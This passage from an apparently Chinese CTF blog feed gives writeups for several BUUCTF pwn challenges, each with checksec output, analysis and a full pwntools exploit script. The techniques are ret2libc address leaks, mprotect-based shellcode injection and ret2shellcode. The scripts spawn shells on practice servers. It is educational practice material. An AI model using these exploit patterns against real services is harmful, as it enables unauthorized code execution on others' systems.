class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node3.buuoj.cn&#x27;,27043)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./2018_rop&#x27;)<br><br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)<br>r.sendline(payload)<br><span class="hljs-attribute">write_addr</span>=u32(r.recv(4))<br><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">offset</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><br><span class="hljs-attribute">system_addr</span>=offset+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bin_sh</span>=offset+libc.dump(&#x27;str_bin_sh&#x27;)<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn题第五天</title>
    <link href="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/"/>
    <url>/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题（我是废物全靠查篇）"><a href="#BUUCTF刷题（我是废物全靠查篇）" class="headerlink" title="BUUCTF刷题（我是废物全靠查篇）"></a>BUUCTF刷题（我是废物全靠查篇）</h1><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><p>例行check,64位，只开了NX保护</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>丢进ida，审计一下main函数，发现只有1的时候有用。</p><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225133704533.png" class title="image-20230225133704533"><p>跟进选项1中主要函数encrypt()，跟之前一道题很像，具体思路就是:</p><ul><li><code>gets(s);</code>存在栈溢出。</li><li>用<code>\x00</code>绕过<code>strlen(s)</code>，形成栈溢出。</li><li>泄露<code>puts()</code>地址，打常规ret2libc</li></ul><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225144507662.png" class title="image-20230225144507662"><p>附上exp:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>#start<br>r = process(<span class="hljs-string">&quot;../buu/ciscn_2019_en_2&quot;</span>)<br># r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28559</span>)<br>lib = ELF(<span class="hljs-string">&quot;../buu/ubuntu18(64).so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;../buu/ciscn_2019_en_2&quot;</span>)<br><br>#params<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>rdi_addr = <span class="hljs-number">0x400c83</span><br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>ret=<span class="hljs-number">0x4006b9</span><br><br>#attack<br>payload = b<span class="hljs-string">&#x27;\x00&#x27;</span> + b<span class="hljs-string">&#x27;M&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span><span class="hljs-number">-1</span>) +p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>r.recv()<br>r.sendline(b<span class="hljs-string">&quot;1&quot;</span>)<br>r.recv()<br>r.sendline(payload)<br>r.recvline()<br>r.recvline()<br>puts_addr = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>print(<span class="hljs-string">&quot;puts_addr: &quot;</span> + hex(puts_addr))<br><br># libc<br>base_addr = puts_addr - lib.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = base_addr + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh_addr = base_addr + next(lib.search(b<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>print(<span class="hljs-string">&quot;system_addr: &quot;</span> + hex(system_addr))<br>print(<span class="hljs-string">&quot;bin_sh_addr&quot;</span> + hex(bin_sh_addr))<br># obj = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br># base_addr = puts_addr &gt;&gt; <span class="hljs-number">24</span><br># base_addr = base_addr &lt;&lt; <span class="hljs-number">24</span><br># system_addr = base_addr+ obj.dump(<span class="hljs-string">&quot;system&quot;</span>)        #<span class="hljs-keyword">system</span> 偏移<br># bin_sh_addr = base_addr+ obj.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)    #/bin/sh 偏移<br><br><br><br>#attack2<br>payload2 = b<span class="hljs-string">&#x27;\x00&#x27;</span> + b<span class="hljs-string">&#x27;M&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span><span class="hljs-number">-1</span>) + p64(ret) +p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)<br>r.recv()<br>r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.recv()<br>r.sendline(payload2)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://blog.csdn.net/m0sway/article/details/123731062?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-2-123731062-blog-105402942.pc_relevant_vip_default&spm=1001.2101.3001.4242.2&utm_relevant_index=5">(82条消息) ciscn_2019_en_2_m0sway的博客-CSDN博客</a></p><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>例行检查：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>main函数中发现gets，shift+f12发现了flag.txt</p><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225145040805.png" class title="image-20230225145040805"><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225145130851.png" class title="image-20230225145130851"><p>我一开始的思路是利用main函数里的gets造成溢出，覆盖返回地址去读出flag，然后利用get_secret函数的输入点造成溢出然后覆盖返回地址到write函数的地址，打印出unk_80CF91B里的flag的内容，但是后来在百度fgets的用法的时候，发现它能够避免造成溢出，而且fl4g在bss段，没有ret指令可以继续控制程序。</p><p>后来我在程序了发现了mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell，这题的做法跟get_started_3dsctf_2016这题类似</p><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225145759614.png" class title="image-20230225145759614"><p>由于需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret&#x3D;0x806fcc8</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">ROPgadget --binary not_the_same_3dsctf_2016 --<span class="hljs-keyword">only</span> <span class="hljs-string">&quot;pop|ret&quot;</span>|<span class="hljs-keyword">grep</span> <span class="hljs-keyword">pop</span><br></code></pre></td></tr></table></figure><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225145833901.png" class title="image-20230225145833901"><p>ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr&#x3D;0x80eb000</p><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225145854186.png" class title="image-20230225145854186"><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span>  =<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x2d</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">mprotect</span>)+<span class="hljs-title">p32</span>(<span class="hljs-variable">p3_ret</span>)</span><br><span class="hljs-variable">payload</span> +=<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">addr</span>)+<span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x100</span>)+<span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x7</span>)</span><br></code></pre></td></tr></table></figure><p>将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最好读入shellcode</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> +=<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">read_addr</span>)+<span class="hljs-title">p32</span>(<span class="hljs-variable">p3_ret</span>)</span><br><br><span class="hljs-variable">payload</span> +=<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-number">0</span>)+<span class="hljs-title">p32</span>(<span class="hljs-variable">addr</span>)+<span class="hljs-title">p32</span>(<span class="hljs-title">len</span>(<span class="hljs-variable">shellcode</span>))+<span class="hljs-title">p32</span>(<span class="hljs-variable">addr</span>)</span><br><span class="hljs-variable">r.sendline</span>(<span class="hljs-variable">payload</span>)<br><span class="hljs-variable">r.sendline</span>(<span class="hljs-variable">shellcode</span>)<br></code></pre></td></tr></table></figure><p>附上exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node3.buuoj.cn&#x27;,29651)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;not_the_same_3dsctf_2016&#x27;)<br><span class="hljs-attribute">read_addr</span>=elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-attribute">mprotect</span>=0x806ED40<br><span class="hljs-attribute">addr</span>=0x80eb000<br><span class="hljs-attribute">p3_ret</span>=0x806fcc8<br><br><span class="hljs-attribute">shellcode</span>=asm(shellcraft.sh())<br><br>payload  =<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x2d+p32(mprotect)+p32(p3_ret)<br>payload +=p32(addr)+p32(0x100)+p32(0x7)<br><br>payload +=p32(read_addr)+p32(p3_ret)<br><br>payload +=p32(0)+p32(addr)+p32(len(shellcode))+p32(addr)<br><br>r.sendline(payload)<br>r.sendline(shellcode)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>参考文章：[(82条消息) [BUUCTF]PWN14——not_the_same_3dsctf_2016_Angel<del>Yan的博客-CSDN博客](<a href="https://blog.csdn.net/mcmuyanga/article/details/108297572?ops_request_misc=&request_id=&biz_id=102&utm_term=buuctf">https://blog.csdn.net/mcmuyanga/article/details/108297572?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=buuctf</a> not_the_same_3dsctf_201&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2</del>all<del>sobaiduweb</del>default-7-108297572.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p><h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><p>无保护</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br><span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br></code></pre></td></tr></table></figure><p>程序直接提供了写入bss，ret2shellcode.将准备好的shellcode 通过read写入 name . 然后通过gets进行<a href="https://so.csdn.net/so/search?q=%E6%A0%88%E6%BA%A2%E5%87%BA&spm=1001.2101.3001.7020">栈溢出</a>,使其,返回至name所在位置即可</p><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225150542325.png" class title="image-20230225150542325"><img src="/2023/02/19/pwn%E9%A2%98%E7%AC%AC%E4%BA%94%E5%A4%A9/image-20230225150532322.png" class title="image-20230225150532322"><p>shellcraft是pwntools中的一个模块是shellcode的生成器<br>所以<strong>shellcode &#x3D; asm(shellcraft.sh())</strong>.<br>exp如下：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>#p = process(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29663</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>p.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span>) + p64(name_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;What do you want to say to me?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>参考文章：[(82条消息) [BUUCTF-pwn]——ciscn_2019_n_5_Y-peak的博客-CSDN博客](<a href="https://blog.csdn.net/Y_peak/article/details/113790355?ops_request_misc=%7B%22request_id%22:%22167730844216800215084819%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167730844216800215084819&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-113790355-null-null.142%5Ev73%5Einsert_down3,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=buuctf">https://blog.csdn.net/Y_peak/article/details/113790355?ops_request_misc=%7B%22request%5Fid%22%3A%22167730844216800215084819%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167730844216800215084819&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-113790355-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=buuctf</a> ciscn_2019_n_5&amp;spm&#x3D;1018.2226.3001.4187)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn题第四天</title>
    <link href="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/"/>
    <url>/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><p>check,没有canary保护，nx保护开启排除shellcode可能性，FULL RELEO为地址随机化。:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>主函数的思路大概是：生成一个随机数，把这个随机数作为参数传进sub_804871F()函数里，然后将该函数返回的结果作为参数再传进sub_80487D0()里</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215319893.png" class title="image-20230213215319893"><p>sprintf（）函数将生成的随机数a1加到了s[32]的数组中。这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：使strncmp结果为0</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215440021.png" class title="image-20230213215440021"><p>sub_804871F()函数会将buf[7]作为参数传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215551011.png" class title="image-20230213215551011"><p>附上exp:</p><p>参考文章:[(74条消息) BUUCTF–[OGeek2019]babyrop_Loτυs的博客-CSDN博客_[ogeek2019]babyrop](<a href="https://blog.csdn.net/Invin_cible/article/details/121322885?ops_request_misc=%7B%22request_id%22:%22167629620016800222825803%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167629620016800222825803&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121322885-null-null.142%5Ev73%5Einsert_down3,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=buuctf">https://blog.csdn.net/Invin_cible/article/details/121322885?ops_request_misc=%7B%22request%5Fid%22%3A%22167629620016800222825803%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167629620016800222825803&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121322885-null-null.142^v73^insert_down3,201^v4^add_ask,239^v1^control&amp;utm_term=buuctf</a> babyrop&amp;spm&#x3D;1018.2226.3001.4187)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,25501)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu共享文件夹/BUUCTF/pwnn2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;\x00&#x27;</span>+<span class="hljs-string">&#x27;\xff&#x27;</span><span class="hljs-number">*7</span><br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>main_addr = 0x08048825<br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>xe7+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*4</span>+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)<br>r.sendline(payload1)<br>write_addr = u32(r.recv(4))<br><span class="hljs-built_in">print</span>(hex(write_addr))<br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write_addr)<br>libc_base = write_addr -  libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>system_addr = libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bin_sh_addr = libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2 = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>xe7+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*4</span>+p32(system_addr)+p32(0)+p32(bin_sh_addr)<br>r.sendline(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><p>经典check:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>跟那个32位的没啥区别,只是参数进栈方式不同，附上exp:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-comment">#p=process(&quot;level2_x64&quot;)</span><br><span class="hljs-attribute">p</span>=remote(&quot;node4.buuoj.cn&quot;,27665)<br><span class="hljs-attribute">pop_rdi_ret</span>=0x00000000004006b3<br><br><span class="hljs-attribute">system</span>=0x4004C0<br><span class="hljs-attribute">str_bin_sh</span>=0x600A90<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x88)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system)<br><br>p.recvuntil(<span class="hljs-string">&quot;:\n&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><p>经典check:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>shift+f12,查看关键字符串</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213220847435.png" class title="image-20230213220847435"><p>双击，ctrl+x，进入反汇编代码：</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213220935498.png" class title="image-20230213220935498"><p>ROPgadget查看返回地址，附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 